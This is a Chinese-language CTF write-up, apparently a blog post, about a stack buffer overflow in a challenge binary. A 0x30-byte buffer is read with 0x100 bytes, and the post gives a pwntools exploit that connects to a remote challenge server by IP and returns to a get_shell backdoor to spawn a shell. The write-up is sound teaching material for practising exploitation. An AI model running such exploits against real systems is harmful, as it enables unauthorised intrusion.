---
layout: post
---
先file打开查看文件

![image](https://user-images.githubusercontent.com/98165037/187692307-6cbc76d4-d8aa-4371-b2ff-6360dfbb5452.png)

接着checksec查看文件开启了哪些保护

![image](https://user-images.githubusercontent.com/98165037/187692991-5b60e48e-70a7-466e-9718-098fd8189651.png)

显示没有开启什么保护，只有一个Partial RELRO

把文件放进ida里看看，按f5

![image](https://user-images.githubusercontent.com/98165037/187866414-3d6be811-6b95-4c56-9316-43bdc57a0e01.png)

发现有一个字符数组s的长度定义为48（0x30），但下面的read函数往s里读入了0x100长度的内容，就会产生栈溢出问题

另外还发现了一个后门函数get_shell

![image](https://user-images.githubusercontent.com/98165037/187867096-2c509081-3ce1-4aed-bb7a-254000490518.png)

查看它的地址

![image](https://user-images.githubusercontent.com/98165037/187868458-ef3af477-eef5-4b95-87a8-76abd15a860e.png)

这样就可以通过s处栈溢出ret到后门函数直接拿到shell了

即需要输入0x30个字节的数据覆盖s，再输入8个字节的数据覆盖栈底指针rbp，然后将返回值修改为get_shell_()函数的地址

exp如下：

```python
from pwn import *

io = remote("114.67.246.176", 15587)
payload = b'a' * (0x30 + 0x8) + p64(0x400751)
io.recvline("say something?\n")
io.send(payload)
io.interactive()
```

运行就可以得到flag啦

![image](https://user-images.githubusercontent.com/98165037/187866262-433f7d0f-eaf7-40d4-b65b-f0eb0ccd171f.png)
